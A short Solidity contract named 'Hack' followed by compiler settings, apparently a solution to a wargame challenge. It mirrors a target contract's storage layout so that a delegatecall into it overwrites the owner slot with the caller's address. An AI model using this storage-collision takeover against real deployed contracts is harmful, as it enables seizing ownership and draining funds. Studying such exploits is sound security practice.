// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;            // SLOT 2
    uint storedTime;                 // SLOT 3

  function setTime(uint256 _time) public {
      owner = msg.sender;
  }
    
  function getInt() view public returns(uint160) {
      return uint160(bytes20(address(this)));
  }
}

{
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "libraries": {}
}